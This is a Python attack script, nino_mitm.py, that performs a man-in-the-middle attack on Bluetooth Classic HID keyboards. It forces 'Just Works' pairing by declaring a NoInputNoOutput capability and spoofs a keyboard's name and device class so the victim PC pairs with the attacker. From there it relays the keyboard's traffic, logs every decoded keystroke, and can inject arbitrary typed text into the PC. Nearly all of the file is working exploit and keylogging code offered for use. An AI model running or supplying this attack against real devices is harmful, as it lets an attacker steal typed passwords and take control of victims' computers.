#!/usr/bin/env python3
"""
nino_mitm.py — NiNo Full MITM Attack
======================================
NoInputNoOutput SSP MITM on Bluetooth Classic HID keyboards/mice.

Architecture (single hci0 scatternet):
  [Keyboard] --L2CAP PSM 0x13--> [hci0 / Attacker] --uhid--> [Local OS input]
                                          |
                                    [Keystroke log]
                                    [Injection module]

Both sides are forced to Just Works via NoInputNoOutput IO capability —
neither the keyboard nor the host can request a passkey or numeric comparison.

Usage (must run as root):
  python3 nino_mitm.py --target AA:BB:CC:DD:EE:FF
  python3 nino_mitm.py --target AA:BB:CC:DD:EE:FF --inject "INJECTED"

Output tags:
  [PAIRING]  SSP negotiation / adapter config events
  [RELAY] KEY: <ascii>  decoded keystroke from keyboard
  [INJECT] <payload>    keystroke injected to PC side
  [MITM]    session / relay lifecycle events
"""

import argparse
import os
import socket
import struct
import subprocess
import sys
import threading
import time

import queue

# ---------------------------------------------------------------------------
# HID Boot Keyboard: keycode → (unshifted, shifted)
# ---------------------------------------------------------------------------
HID_KEYMAP: dict[int, tuple[str, str]] = {
    0x04: ('a', 'A'), 0x05: ('b', 'B'), 0x06: ('c', 'C'),
    0x07: ('d', 'D'), 0x08: ('e', 'E'), 0x09: ('f', 'F'),
    0x0A: ('g', 'G'), 0x0B: ('h', 'H'), 0x0C: ('i', 'I'),
    0x0D: ('j', 'J'), 0x0E: ('k', 'K'), 0x0F: ('l', 'L'),
    0x10: ('m', 'M'), 0x11: ('n', 'N'), 0x12: ('o', 'O'),
    0x13: ('p', 'P'), 0x14: ('q', 'Q'), 0x15: ('r', 'R'),
    0x16: ('s', 'S'), 0x17: ('t', 'T'), 0x18: ('u', 'U'),
    0x19: ('v', 'V'), 0x1A: ('w', 'W'), 0x1B: ('x', 'X'),
    0x1C: ('y', 'Y'), 0x1D: ('z', 'Z'),
    0x1E: ('1', '!'), 0x1F: ('2', '@'), 0x20: ('3', '#'),
    0x21: ('4', '$'), 0x22: ('5', '%'), 0x23: ('6', '^'),
    0x24: ('7', '&'), 0x25: ('8', '*'), 0x26: ('9', '('),
    0x27: ('0', ')'),
    0x28: ('[ENTER]', '[ENTER]'),
    0x29: ('[ESC]',   '[ESC]'),
    0x2A: ('[BS]',    '[BS]'),
    0x2B: ('[TAB]',   '[TAB]'),
    0x2C: (' ',       ' '),
    0x2D: ('-', '_'), 0x2E: ('=', '+'),
    0x2F: ('[', '{'), 0x30: (']', '}'), 0x31: ('\\', '|'),
    0x33: (';', ':'), 0x34: ("'", '"'),
    0x35: ('`', '~'), 0x36: (',', '<'), 0x37: ('.', '>'),
    0x38: ('/', '?'),
    0x4F: ('[RIGHT]', '[RIGHT]'), 0x50: ('[LEFT]', '[LEFT]'),
    0x51: ('[DOWN]',  '[DOWN]'),  0x52: ('[UP]',   '[UP]'),
    0x4A: ('[HOME]',  '[HOME]'),  0x4D: ('[END]',  '[END]'),
    0x4B: ('[PGUP]',  '[PGUP]'),  0x4E: ('[PGDN]', '[PGDN]'),
    0x4C: ('[DEL]',   '[DEL]'),
}
# Modifier bitmask for Shift (Left Shift | Right Shift)
MOD_SHIFT = 0x02 | 0x20

# Reverse map for injection: printable char → (keycode, needs_shift)
_ASCII_TO_HID: dict[str, tuple[int, bool]] = {}
for _kc, (_lo, _hi) in HID_KEYMAP.items():
    if _lo and _lo not in _ASCII_TO_HID:
        _ASCII_TO_HID[_lo] = (_kc, False)
    if _hi and _hi != _lo and _hi not in _ASCII_TO_HID:
        _ASCII_TO_HID[_hi] = (_kc, True)


def decode_hid_report(report: bytes) -> str:
    """Decode 8-byte HID boot keyboard report to printable string.
    Report format: [modifier, reserved, key0, key1, key2, key3, key4, key5]
    """
    if len(report) < 8:
        return ''
    modifier = report[0]
    shifted = bool(modifier & MOD_SHIFT)
    chars = []
    for kc in report[2:8]:
        if kc == 0:
            continue
        pair = HID_KEYMAP.get(kc)
        if pair:
            chars.append(pair[1] if shifted else pair[0])
        else:
            chars.append(f'[kc=0x{kc:02x}]')
    return ''.join(chars)


# ---------------------------------------------------------------------------
# HID Report Descriptor — standard boot-compatible 6KRO keyboard
# ---------------------------------------------------------------------------
HID_REPORT_DESCRIPTOR = bytes([
    0x05, 0x01,        # Usage Page (Generic Desktop)
    0x09, 0x06,        # Usage (Keyboard)
    0xA1, 0x01,        # Collection (Application)
    # --- Modifier keys (8 bits) ---
    0x05, 0x07,        #   Usage Page (Key Codes)
    0x19, 0xE0,        #   Usage Minimum (224 = Left Ctrl)
    0x29, 0xE7,        #   Usage Maximum (231 = Right GUI)
    0x15, 0x00,        #   Logical Minimum (0)
    0x25, 0x01,        #   Logical Maximum (1)
    0x75, 0x01,        #   Report Size (1 bit)
    0x95, 0x08,        #   Report Count (8)
    0x81, 0x02,        #   Input (Data, Variable, Absolute)
    # --- Reserved byte ---
    0x95, 0x01,        #   Report Count (1)
    0x75, 0x08,        #   Report Size (8 bits)
    0x81, 0x03,        #   Input (Constant)
    # --- LED output (5 bits + 3 pad) ---
    0x95, 0x05,        #   Report Count (5)
    0x75, 0x01,        #   Report Size (1 bit)
    0x05, 0x08,        #   Usage Page (LEDs)
    0x19, 0x01,        #   Usage Minimum (Num Lock)
    0x29, 0x05,        #   Usage Maximum (Kana)
    0x91, 0x02,        #   Output (Data, Variable, Absolute)
    0x95, 0x01,        #   Report Count (1)
    0x75, 0x03,        #   Report Size (3 bits)
    0x91, 0x03,        #   Output (Constant)
    # --- Key array (6 keys) ---
    0x95, 0x06,        #   Report Count (6)
    0x75, 0x08,        #   Report Size (8 bits)
    0x15, 0x00,        #   Logical Minimum (0)
    0x25, 0x65,        #   Logical Maximum (101)
    0x05, 0x07,        #   Usage Page (Key Codes)
    0x19, 0x00,        #   Usage Minimum (0)
    0x29, 0x65,        #   Usage Maximum (101)
    0x81, 0x00,        #   Input (Data, Array)
    0xC0,              # End Collection
])


# ---------------------------------------------------------------------------
# uhid interface — present virtual HID keyboard to the local OS (PC side)
#
# The kernel uhid interface expects struct uhid_event (linux/uhid.h).
# We write raw structs to /dev/uhid; no external Python binding needed.
# ---------------------------------------------------------------------------
UHID_DESTROY  = 1
UHID_CREATE2  = 11
UHID_INPUT2   = 12

# struct uhid_event layout for CREATE2:
#   u32  type
#   u8   name[128]
#   u8   phys[64]
#   u8   uniq[64]
#   u16  rd_size
#   u16  bus
#   u32  vendor
#   u32  product
#   u32  version
#   u32  country
#   u8   rd_data[4096]
_CREATE2_FMT = '<I128s64s64sHHIIII4096s'

# struct uhid_event layout for INPUT2:
#   u32  type
#   u16  size
#   u8   data[4096]
_INPUT2_FMT  = '<IH4096s'


def uhid_create(fd: int, name: str = 'NiNo-MITM-Keyboard') -> None:
    rd = HID_REPORT_DESCRIPTOR
    rd_padded = rd + b'\x00' * (4096 - len(rd))
    pkt = struct.pack(
        _CREATE2_FMT,
        UHID_CREATE2,
        name.encode()[:128].ljust(128, b'\x00'),
        b'0:0:0:0'.ljust(64, b'\x00'),   # phys
        b''.ljust(64, b'\x00'),           # uniq
        len(rd),                           # rd_size
        0x0005,                            # BUS_BLUETOOTH
        0x046D,                            # vendor  (Logitech — cosmetic)
        0xC52B,                            # product
        0x0001,                            # version
        0x0000,                            # country
        rd_padded,
    )
    os.write(fd, pkt)


def uhid_send_report(fd: int, report: bytes) -> None:
    """Inject a HID input report into the OS input subsystem."""
    padded = report[:4096].ljust(4096, b'\x00')
    pkt = struct.pack(_INPUT2_FMT, UHID_INPUT2, len(report), padded)
    os.write(fd, pkt)


def uhid_destroy(fd: int) -> None:
    # DESTROY event only needs the type field; pad to avoid short-write
    pkt = struct.pack('<I', UHID_DESTROY) + b'\x00' * 8
    os.write(fd, pkt)


# ---------------------------------------------------------------------------
# HID report construction helpers
# ---------------------------------------------------------------------------
RELEASE_REPORT = bytes(8)  # all-zero = all keys released


def make_hid_report(keycode: int, shift: bool = False) -> bytes:
    mod = 0x02 if shift else 0x00          # Left Shift
    return bytes([mod, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])


def inject_string(uhid_fd: int, text: str, delay: float = 0.02) -> None:
    """Type a string by injecting HID press+release events via uhid."""
    for ch in text:
        entry = _ASCII_TO_HID.get(ch)
        if entry is None:
            print(f'[INJECT] skipping unmapped char {repr(ch)}')
            continue
        keycode, shift = entry
        uhid_send_report(uhid_fd, make_hid_report(keycode, shift))
        time.sleep(delay)
        uhid_send_report(uhid_fd, RELEASE_REPORT)
        time.sleep(delay)
    print(f'[INJECT] {repr(text)}')

def inject_to_pc(pc_intr_sock, text, delay=0.02):
    for ch in text:
        entry = _ASCII_TO_HID.get(ch)
        if entry is None:
            print(f'[INJECT] skipping unmapped char {repr(ch)}')
            continue
        keycode, shift = entry                                                                                                                                         
        pc_intr_sock.send(b'\xA1' + make_hid_report(keycode, shift))
        time.sleep(delay)                                                                                                                                                      
        pc_intr_sock.send(b'\xA1' + RELEASE_REPORT)
        time.sleep(delay)                                                                                                                                                      
    print(f'[INJECT] {repr(text)}')


# ---------------------------------------------------------------------------
# L2CAP socket helpers
# ---------------------------------------------------------------------------
HID_PSM_CONTROL   = 0x0011
HID_PSM_INTERRUPT = 0x0013
# First byte of HID-over-L2CAP DATA | INPUT report
HID_HEADER_DATA_INPUT = 0xA1


def open_l2cap(bt_addr: str, psm: int, timeout: float = 10.0) -> socket.socket:
    """Open a SEQPACKET L2CAP socket to bt_addr:psm."""
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
    sock.settimeout(timeout)
    sock.connect((bt_addr, psm))
    sock.settimeout(None)
    return sock


# ---------------------------------------------------------------------------
# BlueZ helpers — adapter config via btmgmt
# ---------------------------------------------------------------------------
def _run(cmd: list[str]) -> None:
    r = subprocess.run(cmd, capture_output=True, text=True)
    label = ' '.join(cmd[2:]) if len(cmd) > 2 else ' '.join(cmd)
    if r.returncode != 0:
        print(f'[PAIRING] WARN {label}: {r.stderr.strip() or r.stdout.strip()}')
    else:
        print(f'[PAIRING] {label}: ok')


def bt_setup_nino(hci: str = 'hci0') -> None:
    """Set adapter IO capability to NoInputNoOutput and make it connectable."""
    # Power cycle so btmgmt changes take effect cleanly
    _run(['btmgmt', '-i', hci, 'power', 'off'])
    _run(['btmgmt', '-i', hci, 'io-cap', '3'])   # 3 = NoInputNoOutput
    _run(['btmgmt', '-i', hci, 'bondable', 'on'])
    _run(['btmgmt', '-i', hci, 'pairable', 'on'])
    _run(['btmgmt', '-i', hci, 'power', 'on'])
    _run(['btmgmt', '-i', hci, 'connectable', 'on'])

def bt_advertise_as_keyboard(hci, name='X-KEY 38BT (2)'):
    _run(['btmgmt', '-i', hci, 'name', name])             # spoof keyboard name so macOS shows keyboard icon
    _run(['hciconfig', hci, 'class', '0x002540'])         # CoD: Peripheral/Keyboard (0x05 major, 0x40 minor, Limited Discoverable)
    _run(['btmgmt', '-i', hci, 'discov', 'on'])          # make adapter discoverable (BlueZ 5.64+ syntax)
    _run(['btmgmt', '-i', hci, 'connectable', 'on'])
    r = subprocess.run(['sdptool', 'add', 'KEYB'], capture_output=True, text=True)
    if r.returncode == 0:
        print('[PAIRING] SDP HID record registered')
    else:
        print(f'[PAIRING] WARN SDP HID register failed: {r.stderr.strip() or r.stdout.strip()}')

def accept_pc_connection(timeout=120.0):
    ctrl_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)          
    ctrl_server.setsockopt(274, 4, struct.pack("2B", 1, 0))                                                                                         
    ctrl_server.bind(("00:00:00:00:00:00", HID_PSM_CONTROL))      # PSM 0x0011                                                                                                                  
    ctrl_server.listen(1)
    ctrl_server.settimeout(timeout)                                                                                                                                            
    pc_ctrl_sock, pc_addr = ctrl_server.accept()
    ctrl_server.close()                                                                                                                               
    
    intr_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)  
    intr_server.setsockopt(274, 4, struct.pack("2B", 1, 0))                                                                                                  
    intr_server.bind(("00:00:00:00:00:00", HID_PSM_INTERRUPT))    # PSM 0x0013
    intr_server.listen(1)                                                                                                                                                      
    intr_server.settimeout(timeout)
    pc_intr_sock, _ = intr_server.accept()
    intr_server.close()

    return (pc_ctrl_sock, pc_intr_sock, pc_addr)  
    

def bt_connect(bt_addr: str, hci: str = 'hci0') -> None:
    """Pair with keyboard via btmgmt (establishes ACL+link key without BlueZ
    input plugin claiming the HID L2CAP channels)."""
    print(f'[PAIRING] Connecting to keyboard {bt_addr} ...')
    # Use btmgmt pair (-t 0 = BR/EDR) so BlueZ does SSP but does NOT open
    # HID profiles — that keeps PSM 0x11/0x13 free for our own L2CAP sockets.
    r = subprocess.run(
        ['btmgmt', '-i', hci, 'pair', '-t', '0', bt_addr],
        capture_output=True, text=True, timeout=30,
    )
    out = r.stdout + r.stderr
    if 'Pairing successful' in out or r.returncode == 0:
        print(f'[PAIRING] ACL + pairing to {bt_addr}: ok')
    else:
        # Non-fatal: the L2CAP connect below will surface the real error
        print(f'[PAIRING] WARN btmgmt pair: {out.strip()[:200]}')


# ---------------------------------------------------------------------------
# Relay loop: keyboard L2CAP interrupt → keystroke log + uhid forward
# ---------------------------------------------------------------------------
def relay_kb_to_pc(kb_intr_sock, pc_intr_sock, stop):
    kb_intr_sock.settimeout(1.0)
    while not stop.is_set():
        try:
            raw = kb_intr_sock.recv(64)
        except socket.timeout:
            continue
        except OSError as e:
            print(f'[MITM] Relay socket error: {e}')
            break

        if not raw:
            print('[MITM] Keyboard side closed connection')
            break

        # Strip HID-over-L2CAP header byte (0xA1 = DATA | INPUT) if present
        report = raw[1:] if (raw[0] == HID_HEADER_DATA_INPUT) else raw

        # Pad to full 8-byte boot keyboard format if needed
        if len(report) < 8:
            report = report + b'\x00' * (8 - len(report))

        decoded = decode_hid_report(report)
        if decoded:
            print(f'[RELAY] KEY: {decoded}')

        # Forward verbatim to PC side via pc_intr_sock
        data = b'\xA1' + report[:8]
        n = pc_intr_sock.send(b'\xA1' + report[:8])
        if n != len(data):                                                                                                             
            print(f'[RELAY] SHORT SEND: sent {n}/{len(data)}')
        else:                                                                                                                          
            print(f'[RELAY] SENT OK: {data.hex()}')

    print('[MITM] Relay loop stopped')

def relay_pc_to_kb(pc_ctrl_sock, kb_ctrl_sock, stop):
    pc_ctrl_sock.settimeout(1.0)
    while not stop.is_set():
        try:                                                                                                                                                   
            raw = pc_ctrl_sock.recv(64)   # settimeout(1.0) for the stop check
        except socket.timeout:
            continue
        if raw:                                                                                                                                                                
            kb_ctrl_sock.send(raw)    # forward verbatim

def relay_kb_ctrl_to_pc(kb_ctrl_sock, pc_ctrl_sock, stop):                                                                     
    kb_ctrl_sock.settimeout(1.0)                                                                                               
    while not stop.is_set():                
        try:                                                                                                                   
            raw = kb_ctrl_sock.recv(64)
        except socket.timeout:                                                                                                 
            continue
        except OSError:                                                                                                        
            break
        print(f'[CTRL←KB] {raw.hex()}')
        if raw:                             
            pc_ctrl_sock.send(raw)      

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(
        description='NiNo Full MITM — NoInputNoOutput SSP attack on BT HID keyboards',
    )
    parser.add_argument('--target',   required=True, metavar='BD_ADDR',
                        help='Keyboard Bluetooth address (AA:BB:CC:DD:EE:FF)')
    parser.add_argument('--hci',      default='hci0',     help='HCI device (default: hci0)')
    parser.add_argument('--name',     default='X-KEY 38BT (FAKE)',
                        help='Adapter name to advertise to victim PC (default: X-KEY 38BT)')
    parser.add_argument('--uhid-dev', default='/dev/uhid', help='uhid device path')
    parser.add_argument('--inject',   metavar='TEXT',
                        help='Inject TEXT after relay is established, then keep running')
    args = parser.parse_args()

    # ---- 1. Adapter setup (NoInputNoOutput) --------------------------------
    bt_setup_nino(args.hci)
    time.sleep(1)

    # ---- 2. CoD + SDP + discoverable to target PC -----------------------------
    bt_advertise_as_keyboard(args.hci, args.name)

    # # ---- DEPRECATED 2. PC-facing side: virtual keyboard via uhid ----------------------
    # print(f'[MITM] Opening uhid at {args.uhid_dev}')
    # try:
    #     uhid_fd = os.open(args.uhid_dev, os.O_RDWR)
    # except OSError as e:
    #     sys.exit(f'[ERROR] Cannot open {args.uhid_dev}: {e}  (modprobe uhid?)')

    # uhid_create(uhid_fd)
    # time.sleep(0.5)   # give kernel time to register the device
    # print('[MITM] Virtual keyboard registered (PC side ready)')

    # ---- 3. waiting for PC inbound ----------------------


    pc_queue = queue.Queue()
    accept_pc_thread = threading.Thread (
        target=lambda: pc_queue.put(accept_pc_connection()),
        name='accept_pc',
        daemon=True,
    )
    accept_pc_thread.start()

    def _pair_on_connect(target_kb):
      import re
      hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
      hci.bind((0,))
      hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,
                     struct.pack("IIIh2x", 0xffffffff, 0xffffffff, 0xffffffff, 0))
      while True:
          pkt = hci.recv(260)
          if len(pkt) >= 14 and pkt[1] == 0x03 and pkt[3] == 0x00:   # HCI_EV_CONN_COMPLETE
              addr = ':'.join(f'{b:02X}' for b in reversed(pkt[6:12]))
              if addr.upper() != target_kb.upper():
                  subprocess.Popen(['btmgmt', '-i', 'hci0', 'pair',
                                    '-c', '3', '-t', '0', addr])
                  break
      hci.close()

    threading.Thread(target=_pair_on_connect, args=(args.target,),
                   daemon=True, name='pair_pc').start()
    print('[MITM] Waiting for PC to connect ...')


    # ---- 3. Keyboard-facing side: connect + open L2CAP --------------------
    bt_connect(args.target, args.hci)
    time.sleep(2)     # wait for ACL + SDP to settle

    print(f'[MITM] Opening HID Control channel  (PSM 0x{HID_PSM_CONTROL:04x})')
    try:
        kb_ctrl_sock = open_l2cap(args.target, HID_PSM_CONTROL)
    except OSError as e:
        sys.exit(f'[ERROR] L2CAP Control connect failed: {e}')

    print(f'[MITM] Opening HID Interrupt channel (PSM 0x{HID_PSM_INTERRUPT:04x})')
    try:
        kb_intr_sock = open_l2cap(args.target, HID_PSM_INTERRUPT)
    except OSError as e:
        kb_ctrl_sock.close()
        sys.exit(f'[ERROR] L2CAP Interrupt connect failed: {e}')

    print(f'[MITM] Session established with {args.target}')

    pc_ctrl_sock, pc_intr_sock, pc_addr = pc_queue.get(timeout=120)
    print(f'[MITM] PC connected from {pc_addr}, {pc_ctrl_sock}, {pc_intr_sock}')

    # ---- 4. Start relay thread --------------------------------------------
    stop_event = threading.Event()
    relay_thread = threading.Thread(
        target=relay_kb_to_pc,
        args=(kb_intr_sock, pc_intr_sock, stop_event),
        daemon=True,
        name='relay',
    )
    relay_thread.start()
    relay_pc_kb_thread = threading.Thread(
        target=relay_pc_to_kb,
        args=(pc_ctrl_sock, kb_ctrl_sock, stop_event),
        daemon=True,
        name='relay_pc_kb'
    )
    relay_pc_kb_thread.start()
    relay_kb_ctrl_thread = threading.Thread(
        target=relay_kb_ctrl_to_pc,                                                                                                
        args=(kb_ctrl_sock, pc_ctrl_sock, stop_event),
        daemon=True, name='relay_kb_ctrl'             
    )                                           
    relay_kb_ctrl_thread.start() 
    print('[MITM] Relay active — type on keyboard to see logged keystrokes')

    # ---- 5. Optional injection demo ----------------------------------------
    if args.inject:
        time.sleep(1)
        inject_to_pc(pc_intr_sock, args.inject)

    # ---- 6. Run until Ctrl-C -----------------------------------------------
    try:
        while relay_thread.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print('\n[MITM] Shutting down ...')

    stop_event.set()
    relay_thread.join(timeout=3)
    relay_pc_kb_thread.join(timeout=3)
    relay_kb_ctrl_thread.join(timeout=3)

    # ---- 7. Cleanup --------------------------------------------------------
    kb_intr_sock.close()
    kb_ctrl_sock.close()
    # uhid_destroy(uhid_fd)
    # os.close(uhid_fd)
    pc_intr_sock.close()
    pc_ctrl_sock.close()
    print('[MITM] Done')
    return 0


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('Error: must run as root (requires AF_BLUETOOTH + /dev/uhid)')
    sys.exit(main())
